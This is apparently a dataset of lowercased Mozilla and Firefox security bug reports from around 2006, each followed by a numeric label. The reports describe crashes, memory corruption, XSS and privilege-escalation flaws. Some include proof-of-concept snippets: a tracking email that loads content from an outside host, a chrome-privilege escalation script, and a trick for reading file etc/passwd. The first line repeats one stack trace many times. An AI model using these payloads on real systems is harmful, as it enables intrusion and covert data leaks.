builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/nsboxframe.cpp line 948 nsgridcell getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridcell.cpp line 84 nsgrid getprefrowheight c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 986 nsgrid getprefrowsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 589 nsgridrowleaflayout getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridrowleaflayout.cpp line 92 nsboxframe getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/nsboxframe.cpp line 948 nsgridcell getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridcell.cpp line 84 nsgrid getprefrowheight c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 986 nsgrid getprefrowsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 589 nsgridrowleaflayout getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridrowleaflayout.cpp line 92 nsboxframe getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/nsboxframe.cpp line 948 nsgridcell getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridcell.cpp line 84 nsgrid getprefrowheight c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 986 nsgrid getprefrowsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 589 nsgridrowleaflayout getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridrowleaflayout.cpp line 92 nsboxframe getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/nsboxframe.cpp line 948 nsgridcell getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridcell.cpp line 84 nsgrid getprefrowheight c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 986 nsgrid getprefrowsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 589 nsgridrowleaflayout getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridrowleaflayout.cpp line 92 nsboxframe getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/nsboxframe.cpp line 948 nsgridcell getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridcell.cpp line 84 nsgrid getprefrowheight c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 986 nsgrid getprefrowsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 589 nsgridrowleaflayout getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridrowleaflayout.cpp line 92 nsboxframe getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/nsboxframe.cpp line 948 nsgridcell getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridcell.cpp line 84 nsgrid getprefrowheight c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 986 nsgrid getprefrowsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 589 nsgridrowleaflayout getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridrowleaflayout.cpp line 92 nsboxframe getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/nsboxframe.cpp line 948 nsgridcell getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridcell.cpp line 84 nsgrid getprefrowheight c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 986 nsgrid getprefrowsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 589 nsgridrowleaflayout getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridrowleaflayout.cpp line 92 nsboxframe getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/nsboxframe.cpp line 948 nsgridcell getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridcell.cpp line 84 nsgrid getprefrowheight c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 986 nsgrid getprefrowsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 589 nsgridrowleaflayout getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridrowleaflayout.cpp line 92 nsboxframe getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/nsboxframe.cpp line 948 nsgridcell getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridcell.cpp line 84 nsgrid getprefrowheight c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 986 nsgrid getprefrowsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 589 nsgridrowleaflayout getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridrowleaflayout.cpp line 92 nsboxframe getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/nsboxframe.cpp line 948 nsgridcell getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridcell.cpp line 84 nsgrid getprefrowheight c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 986	11
window.controllers allows some evil things controllers.appendcontroller and controllers.getcontrollerat allows creation of false xpcom objects additionally controllers.removecontrollerat 0 denies some user operations including copy paste etc	9
cve-2006-0294 fix crash with evil testcase switching from position relative to static see upcoming testcase when clicking on the button current mozilla builds crash this does n't happen in mozilla1.7 talkback id tb12309372w nsiview destroy c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/view/src/nsview.cpp line 307 nssplittableframe destroy c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/generic/nssplittableframe.cpp line 71 nspositionedinlineframe destroy c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/generic/nsinlineframe.cpp line 1052 nsframelist destroyframes c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/generic/nsframelist.cpp line 138 nspositionedinlineframe destroy c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/generic/nsinlineframe.cpp line 1052 nsblockframe removeframe c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/generic/nsblockframe.cpp line 5516 nsframemanager removeframe c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/base/nsframemanager.cpp line 704 nscssframeconstructor contentremoved c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/base/nscssframeconstructor.cpp line 9946 nscssframeconstructor recreateframesforcontent c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/base/nscssframeconstructor.cpp line 11495 nscssframeconstructor restyleelement c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/base/nscssframeconstructor.cpp line 10377 nscssframeconstructor processonerestyle c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/base/nscssframeconstructor.cpp line 13211 nscssframeconstructor processpendingrestyles c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/base/nscssframeconstructor.cpp line 13259 nscssframeconstructor restyleevent handleevent c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/base/nscssframeconstructor.cpp line 13324 shell32.dll	11
memory corruption via queryinterface cve-2006-0295 user-agent mozilla/5.0 x11 u linux i686 en-us rv:1.9a1 gecko/20051205 firefox/1.6a1 build identifier mozilla/5.0 x11 u linux i686 en-us rv:1.9a1 gecko/20051205 firefox/1.6a1 queryinterface on the navigator object triggers memory corruption on both 1.5 and latest cvs trunk on linux 7 in nsprofilelock fatalsignalhandler signo=11 at nsprofilelock.cpp:210 8 signal handler called 9 in nsqueryinterfacewitherror operator this aiid answer at nscomptr.cpp:64 10 in nscomptr nsiinterfacerequestor assign_from_qi_with_error this qi aiid at nscomptr.h:1242 11 in nscomptr this qi at nscomptr.h:653 12 in nsgetinterface operator this aiid ainstanceptr at nsiinterfacerequestorutils.cpp:49 13 in nscomptr nsiscriptglobalobject assign_from_helper this helper aiid at nscomptr.h:1292 14 in nscomptr this helper at nscomptr.h:694 gdb frame 9 9 in nsqueryinterfacewitherror operator this aiid answer at nscomptr.cpp:64 64 status mrawptr queryinterface aiid answer gdb p mrawptr 1 class nsisupports gdb p mrawptr can not access memory at address mrawptr looks like ascii exploitability is not clear at the moment but with favorable heap layout it may be possible ala the window winblows bug testcase to follow reproducible always	11
javascript execution when forwarding or replying cve-2006-0884 user-agent mozilla/5.0 x11 u linux i686 en-us rv:1.8 gecko/20051111 firefox/1.5 build identifier mozilla/5.0 x11 u linux i686 en-us rv:1.8 gecko/20051111 firefox/1.5 it is possible to inject javascript in thunderbird 1.0.7 and 1.5rc the js is executed if the luser selects forward as inline 1.5rc or forward as inline or reply 1.0.7 this has at least privacy implications for tracking the body of forwarded messages e.g indian developers sniffing neocolonializm eventually may lead to side effects js console shows strange errors attached local folder reproducible always steps to reproduce instructions in local folder	9
security check of js_valuetofunctionobject can be circumvented 2123 2139 caller js_getscriptedcaller cx cx fp 2140 if caller 2141 js_checkprincipalsaccess cx funobj 2142 caller script principals 2143 js_getfunctionname fun this security check can be circumvented by using settimeout or similar that calls a function without any scripted caller	11
css letter-spacing heap overflow vulnerability zdi-06-010 zdi-can-015 mozilla firefox css letter-spacing heap overflow vulnerability abstract 3com has identified a vulnerability affecting the following products firefox 1.5.x and below mozilla 1.7.x and below vulnerability details a remotely exploitable heap overflow exists in the latest versions of the firefox web browser the flaw is due to incorrect handling of the css letter-spacing element by specifying a large number an attacker can overflow an integer used during memory allocation this buffer is then later used to store user supplied data the vulnerable function computetotalworddimensions can be found in layout/html/base/src/nstextframe.cpp on line 5649 the memory is allocated by newwordbuf prunichar nsmemory alloc sizeof prunichar newwordbufsize and 3 lines later used by memcpy causing the overflow memcpy void newwordbuf awordbuf sizeof prunichar newwordbufsize-moresize the values of newwordbufsize and moresize are influenced by the function computewordfragmentdimensions which again uses the value provided with the letter-spacing attribute on line 5810 in nstextframe.cpp dimensions.width wordlen ts.mletterspacing this situation leads to heap corruption and can be controlled to execute arbitrary code supplied by a malicious attacker source lines differ between version listed are for firefox 1.0.7 credit this vulnerability was discovered by anonymous	11
cve-2006-1530 comparedocumentposition with e4x crashes xpcwrappednativescope systemisbeingshutdown this crashes firefox tested with today s trunk on mac body script document.body.comparedocumentposition foo script body the crash appears to be exploitable so i m making this a security-sensitive bug	11
cve-2006-1531 fix crash with evil xul testcase using listbox/listitem and display table-cell see upcoming testcase which crashes current trunk mozilla s build when visiting the page does n't crash in 2006-01-30 build crashes in 2006-01-31 build so a regression from bug 282105 i think	11
clicking html a link in xul document makes a browser window invisible clicking html a link in xul document makes a browser window invisible xul-doc window xmlns p xmlns a href about blank a a p window 1 w open xul-doc 2 click the link on xul-doc then about blank is loaded 3 move mouse then xul-doc s browser window becomes invisible 4 w.history.back then the browser ui is still invisible but xul-doc s content elements are displayed onto the browser ui note 1.5.0.1 and trunk are affected 1.0.x is not affected when bfcache is disabled this bug is not reproducible on linux this bug is not reproducible i ve tested on windows xp and linux this bug could be used to exploit for example if an attacker created a javascript game page and could convince a user to drag and drop two links about config and javascript onto the invisible bookmarks toolbar and click those bookmarks in sequence then an attacker could run arbitrary code	11
generatecrmfrequest allows privilege escalation crypto.generatecrmfrequest has a vulnerability similar to bug 314865	9
cve-2006-1723 jsxmlqname structure elements cause crash during gc in my test environment i execute all e4x tests using a javascript that loads and executes each test giving each test it unique global object the test e4x/regress/regress-290056.js crashes i call gc after each test using the global object that runs the tests and jsxmlqname uri is gone when js_markxmlqname is called it could be a problem of my test environment please comment	11
mail multiple information disclosure vulnerabilities mozilla thunderbird multiple information disclosure vulnerabilities contributed by crashfr on mardi le 28 février 2006 21h15 from the dept advisory program mozilla thunderbird homepage tested version 1.5 found by crashfr at sysdream dot com this advisory crashfr at sysdream dot com discovery date 2006/02/18 application description full-featured email simple to use powerful and customizable thunderbird is a full-featured email application thunderbird supports imap and pop mail protocols as well as html mail formatting easily import your existing email accounts and messages built-in rss capabilities powerful quick search spell check as you type global inbox deleting attachments and advanced message filtering round out thunderbird s modern feature set description of vulnerability thunderbird s html rendering engine insufficiently filters the loading of external resources from inline html attachments external files are downloaded even if the block loading of remote images in mail messages option is enabled proof of concept iframe exploit subject thunploit by crashfr from crashfr crashfr chez.com to crashfr crashfr chez.com content-type multipart/related type multipart/alternative boundary nextpart_000_0000_de61e470.78f38016 this is a multi-part message in mime format nextpart_000_0000_de61e470.78f38016 content-type multipart/alternative boundary nextpart_001_0001_06199df9.5c825a99 nextpart_001_0001_06199df9.5c825a99 content-type text/plain charset iso-8859-1 content-transfer-encoding 7bit test by crashfr nextpart_001_0001_06199df9.5c825a99 content-type text/html charset iso-8859-1 content-transfer-encoding 7bit html head head body style margin 0px padding 0px border 0px iframe src cid:257481cab71f 562e86af sysdream.com width 100 height 100 frameborder 0 marginheight 0 marginwidth 0 iframe body html nextpart_001_0001_06199df9.5c825a99 nextpart_000_0000_de61e470.78f38016 content-type text/html name basic.html content-transfer-encoding base64 content-id 257481cab71f 562e86af sysdream.com pgh0bww+pghlywq+pc9ozwfkpjxib2r5ihn0ewxlpsjtyxjnaw46idbwedsgcgfkzgluzzogmhb4 oybib3jkzxi6idbwedsipjxpznjhbwugc3jjpsjodhrwoi8vd3d3lnn5c2ryzwftlmnvbsigd2lk dgg9ijewmcuiighlawdodd0imtawjsigznjhbwvib3jkzxi9ijaiig1hcmdpbmhlawdodd0imcig bwfyz2lud2lkdgg9ijaipjwvawzyyw1lpg nextpart_000_0000_de61e470.78f38016 css exploit subject thunploit by crashfr from crashfr crashfr chez.com to crashfr crashfr chez.com content-type multipart/related type multipart/alternative boundary nextpart_000_0000_de61e470.78f38016 this is a multi-part message in mime format nextpart_000_0000_de61e470.78f38016 content-type multipart/alternative boundary nextpart_001_0001_06199df9.5c825a99 nextpart_001_0001_06199df9.5c825a99 content-type text/plain charset iso-8859-1 content-transfer-encoding 7bit test by crashfr nextpart_001_0001_06199df9.5c825a99 content-type text/html charset iso-8859-1 content-transfer-encoding 7bit html head link rel stylesheet type text/css href cid:257481cab71f 562e86af sysdream.com head body body html nextpart_001_0001_06199df9.5c825a99 nextpart_000_0000_de61e470.78f38016 content-type text/css name basic.css content-transfer-encoding base64 content-id 257481cab71f 562e86af sysdream.com qgltcg9ydcb1cmwoahr0cdovl3d3dy5zexnkcmvhbs5jb20vdgvzdc5jc3mpowpib2r5ihsgymfj a2dyb3vuzc1jb2xvcjogi0ndq0ndqzsgfq nextpart_000_0000_de61e470.78f38016 impact successful exploitation may lead to information disclosure user agent application version platform ip address a spammer can easily check if an email is read moreover an html reply to those types of emails will contain the complete url path to the mailbox ie mailbox c 7c/documents 20and 20settings/crashfr application 20data/thunderbird/profiles/7jko3in9.default mail/local 20folders/inbox number=2194930 header=quotebody part=1.2 filename=basic.css solution no known solution you have to wait for a vendor upgrade credits crashfr at sysdream dot com	2
fix persist seems to let any page set any persist value looking at the code in nsxulcontentutils makeelementid it seems like it allows any page to set any persist attribute i.e it can even set persist values for other pages including chrome pages something like hbox id chrome browser/content/browser.xul content persist onnewtab onnewtab alert insert evilness here browseropentab will set the onnewtab attribute in the browser of browser.xul i could n't get this to work exactly like this but i do get a rdf description rdf about chrome browser/content/browser.xul content entry in my localstore it might be that it s only possible to affect attributes that are already persisted which would be bad enough the offending code is nsxulcontentutils makeelementuri which treats ids containing an as an already resolved uri	2
dom property setter override remote compromise messing around i found that running htmldocument.__proto__.__definesetter prototype function alert location.href will cause alert location.href to be executed in the context of the current page periodically for example when the page is right-clicked or when view page info is clicked i ca n't think of a way to exploit this but it does n't seem like proper behavior so i m just throwing it out there to see if anyone with more experience in this area can make something of it also i was wondering what has been done with definegetter overriding dom properties has this type of attack been blocked completely or just specific holes that use it	2
crypto.signtext writing off end-of-array leading to segv with patch user-agent mozilla/5.0 x11 u linux i686 en-us rv:1.8.0.1 gecko/debian-1.8.0.1-5 galeon/2.0.1 debian package 2.0.1-3 build identifier there is an array indexing bug in the implementation of crypto.signtext the wrong index is used starting from 2 instead of 0 when copying varargs canames parameters from the javascript call into an argument array since this is overwriting random memory with a pointer to user-supplied data there s a remote possibility that it s somehow exploitable mitigating it is that only the first two pointers after the array end are overwritten the browser is guaranteed to crash inside the cert_filterlistbycanames call on the next code line and the code is only called for browsers that have client certificates loaded i ll flag it as security just in case two-character fix is dichro amida c diff u mozilla/security/manager/ssl/src/nscrypto.cpp orig mozilla/security/manager/ssl/src/nscrypto.cpp.orig 2006-03-18 12:14:57.000000000 1100 mozilla/security/manager/ssl/src/nscrypto.cpp 2006-03-18 12:15:59.000000000 1100 2167,7 2167,7 return ns_ok canames i js_getstringbytes caname canames i 2 js_getstringbytes caname if certlist dichro amida c reproducible always steps to reproduce 1 ensure there is at least one client certificate loaded in browser firefox release firefox head and mozilla known to crash 2 visit any url with a crypto.signtext call containing optional canames arguments eg actual results port_strcmp presumably segvs killing the browser gdb bt 0 in raise from lib/tls/libpthread.so.0 1 in nsprofilelock fatalsignalhandler from usr/local/lib/firefox-1.6a1/libxul.so 2 signal handler called 3 in strcmp from lib/tls/libc.so.6 4 in cert_filtercertlistbycanames from usr/local/lib/firefox-1.6a1/libnss3.so 5 in nscrypto signtext from usr/local/lib/firefox-1.6a1/components/libpipnss.so expected results not a crash in the case of the example url the page is expected to display this is an html page error nomatchingcert	11
crash with iframe removing itself nsattrandchildarray clear nsattrandchildarray nsattrandchildarray an iframe removing itself from the parent via javascript uri causes memory corruption after 2-3 reloads that may be automated on firefox eip is often on seamonkey there are clear signs of memory corruption both trunk and branch	9
double free in nsvcard.cpp 976 oldbytes would become invalid when pr_realloc succeeded 942 therefore oldbytes should be freed only if bytes is null 995 oldbytes handled correctly here malicious vcard attachment may compromise the system although i have no exploit i confirmed that invalid vcard caused a hang up cpu 100	11
potential int overflow in jsstr.c tagify potential int overflow in jsstr.c tagify there is potential int overflow in jsstr.c tagify could only made it crash on a really perverted config x86_64 linux with a lot of virtual memory and 32 bit compiled firefox if it is possible to make a js string with length of 2^30-c with c small this may be exploitable in other configurations personally ca n't make c less than kilobytes on 32 bit linux yet testcase for 32 bit firefox for x64_64 linux to follow 2162 in tagify 2183 parlen jsstring_length param 2187 taglen jsstring_length str 2 endlen 1 str end 2189 tagbuf jschar js_malloc cx taglen 1 sizeof jschar so if str param and jstring_length 2^30-1 2^30-1+2^30-1+c sizeof jschar will overflow 2^32-1	9
potential xss attack using zwnbsp on utf-8 page reproducable always steps to reproduce just load a testcase actual result script is executed expected result script should not be executed	9
nscryptorunnable run may operate on dead jscontext 1768 nscryptorunnable run 1772 jscontext cx m_args m_cx 1785 if js_evaluatescriptforprincipals cx m_args m_scope principals the jscontext referenced here may already have been destroyed because m_args m_cx is just a weak reference and nscryptorunnable run is called asynchronously	11
chrome global/content/jar can load remote chrome spun off from bug 337744 comment 6 chrome urls can syntactically wrap arbitrary protocols and confer chrome privs some do n't work but wrapping them in jar does luckily we block web content from directly loading chrome urls as content but it would be pretty easy to get a fair number of people to copy or drag a broken link to the address bar to get at content they really wanted download the latest movie or music free pr0n etc chrome global/content does not work because of the channel-unwinding checks at 563 but if remote content were loaded from a jar file it would work e.g chrome global/content/jar	2
xss with xpcnativewrapper window function xpcnativewrapper window function allows one to create a function that can be used for xss attacks	9
extraneous in vcard base64 leads to heap overwrite crash in lexgetdatafrombase64 nsvcard.cpp base64 padding characters are accepted anywhere in the string and the pad count is never reset pad characters anywhere but the last one or two characters are illegal treating them as a would be relatively benign if it were n't for the pad count this ultimately can make numout negative which is passed to memcpy as a very large unsigned size_t if this does n't crash you byteslen is then decremented before you loop back around and do the same thing over 937 a when quadix is 0 or 1 is always invalid base64 and at the very least you should reset pad to 0 when quadix is reset or at that point if pad 0 assume you re at the end of the string and quit or look ahead and return an error if you re not at the end of the string	11
universalbrowserread should not permit access to chrome documents by the nature of the universalbrowserread privilege scripts with this privilege enabled can access any document in anywhere and be able to take control of the user s activity on the web site by reading login cookies the sentisive browser data the problem is anywhere mentioned in the above includes the chrome once the script with ubr enabled have access to a chrome javascript object it can do more than to read sensitive browser data by elevating its privilege to full chrome level see bug 313684	2
security issue through the auto update system and certificate management user-agent mozilla/5.0 x11 u linux i686 en-us rv:1.8.0.3 gecko/20060426 firefox/1.5.0.3 build identifier mozilla/5.0 x11 u linux i686 en-us rv:1.8.0.3 gecko/20060426 firefox/1.5.0.3 the software update system in firefox is assumed to be secure as an invalid certificate or non-matching cn causes the ssl connection to the update server to be reset and firefox displays an error however there is an oversight that exposes a security problem the browser trusts its own certificate cache therefore if an attacker can get his certificate accepted by a victim the attacker gains free reign to hijack the software update session and potentially execute arbitrary code on the victim s host sample scenario victim goes to their favorite ssl-enabled website attacker spoofs dns to redirect them to their lookalike site victim accepts attacker s certificate either permanently or temporarily because they do n't know any better or simply do n't care if someone s snooping on their traffic firefox software update is triggered either manually through help check for updates or automatically the next time firefox is started attacker spoofs dns for aus2.mozilla.org and ssl connection is successful due to the victim s earlier acceptance of the attacker s cert firefox follows the evil xml file and take-over-the-world v1.0 code is downloaded to victim s host usually in the worst case accepting a invalid ssl certificate only results in mitm snooping but in this case the flaw in firefox exposes the victim to local code execution a potential solution would be to not rely on the certificates that a user has accepted when making the ssl connection to the update server regards jon oberheide jonojono arbor.net reproducible always	5
arbitrary code execution by setting fun.__parent to a privileged object a named function created by function expression has a extra parent object that has a property whose name is the function name a function b a.__parent__.tosource b function b there is a way to set the parent object in question to a privileged object i got the hint from bug 338709 object function return privileged_object a function b exploit marquee id m x m.init.eval.prototype x.w window object function return x var a function b with w alert components.stack a.call to avoid the access check in js_computethis	2
crash with this javascript regexp js_newstringcopyn user-agent mozilla/5.0 x11 u linux i686 en-us rv:1.8.0.4 gecko/20060608 ubuntu/dapper-security firefox/1.5.0.4 build identifier mozilla/5.0 x11 u linux i686 en-us rv:1.8.0.4 gecko/20060608 ubuntu/dapper-security firefox/1.5.0.4 will post example file reproducible always steps to reproduce 1.open the submitted file 2.press the popup buttons 3.observe the crash also happened with epiphany on ubuntu dapper	11
regexp ending in reads past end of string received at the security mozilla.org address a friend of mine found a bug in mozilla s javascript re engine we tracked it down and wrote a reliable example that crashes ff on linux mac and windows all versions including cvs one seem to be affected while our findings did n't show any ways of exploiting it there might be a way to combine this with other bugs to run arbitrary code ok now for the details the deadly code script type text/javascript function boo s for try new regexp s catch e s q script a href javascript boo die die die kill kill kill a the culprit is re parser file mozilla/js/src/jsregexp.c line 1337 how appropriate when is read the parser loops looking for but if a is encountered the pointer is advanced twice if is the last character in a regexp state cp runs over the string boundaries fix check if state cp state cpend after incrementing the pointer in line 1338 the example code above tries building a large enough string so that it gets allocated in the end of heap then the parser runs over the end and runs out of allocated vm causing a segfault as for credits it was discovered by canadianguy and tracked down by girts folkmanis and catalin patulea have a nice day and thanks for making the best browser cheers girts	9
xbl and event handlers cause trouble in mailnews and editor xbl and event handlers cause trouble in mailnews and editor i am not sure how many bugs are in this report so help split them if needed when an image is included via xbl in an email message its javascript event handlers onload onmouseover fire in both preview pane and editor when forward inline or reply so this allows 1 javascript exploits in email 2 when forwarding or replying it is possible to steal user s files via dhtml img.src='file etc/passwd document.body.appendchild img 3 privacy implications because of the image fetching affected are thunderbird 1.5.0.5 2.0a1 and seamonkey trunk at least local mailbox with info and xbl file to be attached	2
xss by setting img.src to javascript url 1 get an image element i that was created in a document that was loaded in another window w 2 load an other domain page x into w 3 set i.src to a javascript url a script is executed in the context of x and its principal is a null principal and on branches it s a codebase principal whose uri is javascript this means that the script can not directly access properties of the x s global scope but the script can create a function that has the x s principal by using a named function expression or a nested function img.src javascript alert 1 permission denied to get property window.alert img.src javascript function alert 1 call permission denied to get property window.alert img.src javascript function f alert 1 call ok img.src javascript function function alert 1 call call ok the trunk fx2.0 fx1.5.0.7 fx1.0.8 and moz1.7.13 are affected	9
error finalizing js objects causes liveconnect crash possibly exploitable i will attach a test-case java applet plus invoking html code that demonstrates the problem plus crash logs generated in firefox 1.5.0.6 on mac os x suse linux 9.2 and windows xp pro that demonstrate the potential for exploitability i ll also attach a patch to javaobject_finalize and jsj_gc_callback in js/src/liveconnect/jsj_javaobject.c that seems to fix the problem at least in the context of my test case javaobject_finalize is called from js_finalizeobject in js/src/jsobj.c when the javascript garbage collector wants to get rid of a javaobject whether or not javaobject_finalize has succeeded js_finalizeobject drops the object map and frees the slots for the javaobject or any other kind of javascript object that it s trying to finalize but under some circumstances javaobject_finalize doesn't succeed and doesn't stop the javaobject from continuing to be used as it does keep getting re-used eventually you get a crash the crashes are almost always under js_evaluateucscriptforprincipals and in turn under js_invoke js_execute or js_interpret they appear always to be access violations and often but not always the instruction pointer gets set to values that appear to be inside strings e.g which suggests heap corruption and/or buffer overflows but i suspect that these crashes would be hard to exploit since it would probably be hard to control which data structure and which part of that structure the instruction pointer ends up being set to i do n't really know who to cc this bug to so feel free to add cc s for others you think should be aware of it i just chose the last two people who d made changes to jsj_javaobject.c plus jesse ruderman who i know is interested in finding security holes at least in the mac versions of mozilla.org browsers	11
firefox crashes on certain png images used in the css cursor property ntdll.dll js_arenaallocate user-agent mozilla/5.0 x11 u linux i686 de rv:1.8.0.7 gecko/20060909 firefox/1.5.0.7 build identifier mozilla/5.0 windows u windows nt 5.1 en-us rv:1.8.0.7 gecko/20060909 firefox/1.5.0.7 when i use the cursor url css property firefox crashes on certain images used as cursor the crash happens only in windows xp sp2 but not under linux did n't test in osx and it also seems to depend on the size of the image used crash 32x16.png 33x17.png no crash 32x16.png 33x15.png 33x17.png reproducible sometimes steps to reproduce 1 save the html file as test.html 2 save one of the png file as test.png in the same directory as the html file 3 open the html file 4 click on the test link sometimes actual results firfox crashes after some clicks expected results firfox should not crash all image are plain black no transparency and created with the gimp i tested this on some firefox versions mozilla/5.0 windows u windows nt 5.1 en-us rv:1.7.13 gecko/20060410 firefox/1.0.8 mozilla/5.0 windows u windows nt 5.1 en-us rv:1.8.0.7 gecko/20060909 firefox/1.5.0.7 mozilla/5.0 windows u windows nt 5.1 en-us rv:1.8.1b2 gecko/2006082101 firefox/2.0b2 mozilla/5.0 windows u windows nt 5.1 en-us rv:1.9a1 gecko/2006092004 minefield/3.0a1 1.0.8 and 3.0a1 do n't crash and also do n't display the cursor image 1.5.0.7 an 2.0b2 display the cursor image crash	11
privilege escalation using watchpoint pseudo stack frame constructed by js_watch_set is not aware of function cloning so it can be used to execute arbitrary code with elevated privilege 362	11
running script can be recompiled cve-2006-5463 dbg.obj/js e t 1 s=script s.compile t print t s assertion failure map vector i map length at jsatom.c:919 opt.obj/js e t 1 s=script s.compile t print t s crash you can execute arbitary interpreter bytecodes using this bug	11
ff1507 rsa signature forgery unchecked padding length cve-2006-5462 security mozilla.org received the following from ulrich kuehn dear security group i ve found an implementation bug in handling a certain rsa signature padding format that allows a man-in-the-middle attack on ssl and tls connections under certain circumstances i ll go into details below the bug seems to be present in versions 1.5.0.7 and earlier of firefox and potentially of other mozilla software that uses the nss subsystem i noticed that the problem is resolved in the firefox 2.0 since beta 1 on the ftp server marked as of aug 29 2006 however i ask you to backport a patch to the current version 1.5.0.7 as i believe that users should not be forced to do a major version upgrade due to a security bug that could easily be fixed and the fix is really easy see attached diff maybe the maintainer updating the code did not notice that this seemingly small bug has some severe consequences now for the technical details this bug is somewhat related on a mathematical level to the recent bug that daniel bleichenbacher found for pkcs 1 signature verification nevertheless it does not involve any asn.1 parsing the problem is in security/nss/lib/softoken/rsawrapr.c function rsa_checksign check the padding that was used if buffer 0 0 buffer 1 1 goto loser for i 2 i modulus_len hash_len 1 i if buffer i 0 break if buffer i goto loser make sure we get the same results if port_memcmp buffer modulus_len hash_len hash hash_len 0 goto loser this code runs over the pkcs 1 padding but would accept an early 0 byte so that a padding of 00 01 00 g hash with any garbage in g provided g is long enough to put the hash into the correct place for the following memcmp a word of acknowledgement is due here this code was independently found by hal finney however the consequences seem not be known to him see producing a fake signature i.e a non-signature that is nevertheless accepted by this code is rather easy when an rsa exponent 3 is used for usual key lengths potentially also some larger exponents with longer keys as the 